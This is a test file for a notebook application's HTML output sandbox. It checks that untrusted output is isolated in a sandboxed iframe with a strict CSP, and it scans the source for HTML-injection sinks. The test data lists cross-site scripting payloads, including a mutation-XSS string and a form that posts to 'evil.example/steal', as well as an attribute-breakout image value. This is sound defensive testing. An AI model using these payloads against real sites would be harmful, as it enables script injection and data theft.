/**
 * W-019: notebook output is UNTRUSTED. Rich HTML (text/html) must never be injected into the application's own
 * DOM; it is rendered inside a sandboxed, no-same-origin iframe with a locked-down CSP, so an `<img onerror>`,
 * an SVG handler or a `javascript:` link can neither execute code nor reach the parent application.
 *
 * jsdom does not enforce iframe sandboxing, so these tests pin the CONFIGURATION (attributes, CSP, no live
 * elements in the host document); the behaviour itself is proven in a real browser (see the W-019 entry in
 * Pralai_workspace_backend/docs/WORKSPACE_BUG_LOG.md).
 */
import { readdirSync, readFileSync, statSync } from "node:fs";
import { join } from "node:path";
import { createRoot, type Root } from "react-dom/client";
import { act, createElement } from "react";
import { afterEach, describe, expect, it } from "vitest";
import { PythonOutputs } from "../../src/features/notebook/components/NotebookOutputs";
import { HTML_OUTPUT_CSP, htmlOutputDocument, htmlOutputHeight } from "../../src/features/notebook/htmlOutput";

(globalThis as { IS_REACT_ACT_ENVIRONMENT?: boolean }).IS_REACT_ACT_ENVIRONMENT = true;

const HOSTILE = [
  `<img src=x onerror="window.__pwned=1">`,
  `<svg onload="window.__pwned=1"></svg>`,
  `<script>window.__pwned=1</script>`,
  `<svg><script>window.__pwned=1</script></svg>`,
  `<details open ontoggle="window.__pwned=1">x</details>`,
  `<iframe src="javascript:window.__pwned=1"></iframe>`,
  `<a href="javascript:window.__pwned=1">x</a>`,
  `<form action="https://evil.example/steal"><input name=a></form>`,
  `<link rel="stylesheet" href="https://evil.example/x.css">`,
  `<base href="https://evil.example/">`,
  `</body></html><img src=x onerror="window.__pwned=1">`,
  `<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;img src=1 onerror=window.__pwned=1&gt;">`,
];

let root: Root | null = null;
let host: HTMLElement | null = null;

function render(outputs: unknown[]) {
  host = document.createElement("div");
  document.body.appendChild(host);
  root = createRoot(host);
  act(() => { root!.render(createElement(PythonOutputs, { outputs: outputs as never })); });
  return host;
}
const htmlOutput = (html: unknown) => ({ output_type: "display_data", payload: { mime_bundle: { "text/html": html } } });

afterEach(() => {
  if (root) act(() => root!.unmount());
  host?.remove();
  root = null; host = null;
  delete (window as { __pwned?: number }).__pwned;
});

describe("rich HTML output is isolated from the application", () => {
  it.each(HOSTILE)("renders %s inside a sandboxed iframe and puts no live element in the host document", (payload) => {
    const el = render([htmlOutput(payload)]);

    const frames = el.querySelectorAll("iframe");
    expect(frames).toHaveLength(1);
    // The hostile markup lives only in the iframe's srcdoc string, never as elements of our document.
    expect(el.querySelectorAll("img, svg, script, style, link, a, form, input, details, base, math, table")).toHaveLength(0);
    expect(el.querySelector("[onerror], [onload], [ontoggle], [onfocus]")).toBeNull();
    expect((window as { __pwned?: number }).__pwned).toBeUndefined();
  });

  it("the iframe has an empty sandbox: no scripts, no same-origin, no popups, no top navigation, no forms", () => {
    const frame = render([htmlOutput("<b>x</b>")]).querySelector("iframe")!;
    expect(frame.getAttribute("sandbox")).toBe("");                       // the strictest value
    for (const flag of ["allow-scripts", "allow-same-origin", "allow-popups", "allow-top-navigation", "allow-forms", "allow-modals"]) {
      expect(frame.getAttribute("sandbox")).not.toContain(flag);
    }
    expect(frame.getAttribute("referrerpolicy")).toBe("no-referrer");
    expect(frame.getAttribute("title")).toBeTruthy();
    expect(frame.hasAttribute("src")).toBe(false);                          // srcdoc only: never a URL
    expect(frame.hasAttribute("allow")).toBe(false);                        // no powerful features
  });

  it("the document inside the iframe carries a CSP that blocks scripts and every network load", () => {
    const frame = render([htmlOutput("<b>x</b>")]).querySelector("iframe")!;
    const srcdoc = frame.getAttribute("srcdoc")!;
    expect(srcdoc).toContain(`http-equiv="Content-Security-Policy"`);
    // The EXACT policy: scripts, fetch, frames, objects and fonts all fall under default-src 'none'; images may only
    // be data: URIs (embedded plots), never a URL; inline <style> is allowed for pandas; no forms; no <base href>.
    expect(HTML_OUTPUT_CSP.split("; ")).toEqual([
      "default-src 'none'", "img-src data:", "style-src 'unsafe-inline'", "font-src data:", "form-action 'none'", "base-uri 'none'",
    ]);
  });

  it("the CSP comes before any untrusted content, so the content cannot precede or remove it", () => {
    const doc = htmlOutputDocument(`</head><body onload=alert(1)><meta http-equiv="refresh" content="0;url=https://evil.example">`);
    expect(doc.indexOf("Content-Security-Policy")).toBeGreaterThan(-1);
    expect(doc.indexOf("Content-Security-Policy")).toBeLessThan(doc.indexOf("onload=alert(1)"));
    expect(doc.indexOf("Content-Security-Policy")).toBeLessThan(doc.indexOf("<body"));
  });

  it("links opened from the output cannot navigate the frame away (target=_blank, popups are sandboxed off)", () => {
    expect(htmlOutputDocument("<a href='https://x.example'>x</a>")).toContain(`<base target="_blank">`);
  });

  it("kernel HTML is still shown: the real content reaches the iframe untouched", () => {
    const table = `<table class="dataframe"><tr><th>id</th></tr><tr><td>1</td></tr></table>`;
    const frame = render([htmlOutput(table)]).querySelector("iframe")!;
    expect(frame.getAttribute("srcdoc")).toContain(table);
  });

  it("multi-line HTML sent as an array of strings (Jupyter's format) is joined and isolated too", () => {
    const frame = render([htmlOutput(["<table>", "<tr><td>a</td></tr>", "</table>"])]).querySelector("iframe")!;
    expect(frame.getAttribute("srcdoc")).toContain("<table><tr><td>a</td></tr></table>");
  });

  it("an output with non-string HTML renders nothing dangerous and does not throw", () => {
    const el = render([htmlOutput({ toString: () => "<img src=x onerror=1>" }), htmlOutput(12345), htmlOutput(null)]);
    expect(el.querySelectorAll("img, script")).toHaveLength(0);
  });

  it("several outputs each get their own isolated frame", () => {
    const el = render([htmlOutput("<i>a</i>"), htmlOutput("<i>b</i>")]);
    expect(el.querySelectorAll("iframe")).toHaveLength(2);
  });

  it("an HTML output that is empty shows no frame", () => {
    expect(render([htmlOutput("")]).querySelectorAll("iframe")).toHaveLength(0);
  });
});

describe("other output types are unchanged and still inert", () => {
  it("text/plain is shown as text, never parsed as HTML", () => {
    const el = render([{ output_type: "display_data", payload: { mime_bundle: { "text/plain": "<img src=x onerror=1>" } } }]);
    expect(el.querySelector("pre")!.textContent).toBe("<img src=x onerror=1>");
    expect(el.querySelector("img")).toBeNull();
    expect(el.querySelector("iframe")).toBeNull();
  });

  it("a PNG is an <img> with a data: URI, and a hostile 'base64' value cannot break out of the attribute", () => {
    const evil = `AAAA" onerror="window.__pwned=1`;
    const el = render([{ output_type: "display_data", payload: { mime_bundle: { "image/png": evil } } }]);
    const img = el.querySelector("img")!;
    expect(img.getAttribute("src")!.startsWith("data:image/png;base64,")).toBe(true);
    expect(img.hasAttribute("onerror")).toBe(false);
  });

  it("streams, errors and the empty state are as before", () => {
    const el = render([
      { output_type: "stream", payload: { name: "stdout", text: ["hi ", "there"] } },
      { output_type: "error", payload: { ename: "ValueError", evalue: "<b>bad</b>" } },
    ]);
    const pres = el.querySelectorAll("pre");
    expect(pres[0].textContent).toBe("hi there");
    expect(pres[1].textContent).toBe("ValueError: <b>bad</b>");
    expect(el.querySelector("b")).toBeNull();                               // an error message is text, not markup
  });
});

describe("the frame height", () => {
  it("grows with the content and stays within a sane range", () => {
    const small = htmlOutputHeight("<b>x</b>");
    const big = htmlOutputHeight("<tr><td>1</td></tr>".repeat(200));
    expect(small).toBeGreaterThanOrEqual(40);
    expect(big).toBeGreaterThan(small);
    expect(big).toBeLessThanOrEqual(340);
  });
  it("never throws on odd input", () => {
    for (const v of ["", "<", "<<<<", "\u0000", "<tr".repeat(10_000)]) expect(Number.isFinite(htmlOutputHeight(v))).toBe(true);
  });
});

// ── guard: nothing in the app injects HTML into its own DOM ─────────────
const SRC = join(__dirname, "..", "..", "src");
const SINKS = /dangerouslySetInnerHTML|\.innerHTML\s*=|\.outerHTML\s*=|insertAdjacentHTML|document\.write\(|createContextualFragment|\beval\(|new Function\(/;
const ALLOWED: Record<string, string> = {};     // file -> reason; empty on purpose: add one only with a sanitizer in front

function walk(dir: string): string[] {
  return readdirSync(dir).flatMap((n) => {
    const p = join(dir, n);
    return statSync(p).isDirectory() ? walk(p) : /\.(ts|tsx)$/.test(n) ? [p] : [];
  });
}

describe("no HTML-injection sinks anywhere in the application", () => {
  it("no source file uses dangerouslySetInnerHTML, innerHTML assignment, document.write, eval or new Function", () => {
    const offenders = walk(SRC).flatMap((f) => {
      const rel = f.slice(SRC.length - 3);
      if (ALLOWED[rel]) return [];
      return readFileSync(f, "utf8").split("\n").flatMap((line, i) =>
        SINKS.test(line) && !line.trim().startsWith("//") && !line.trim().startsWith("*") ? [`${rel}:${i + 1}: ${line.trim()}`] : []);
    });
    expect(offenders, `untrusted content must go through SandboxedHtml:\n${offenders.join("\n")}`).toEqual([]);
  });
});
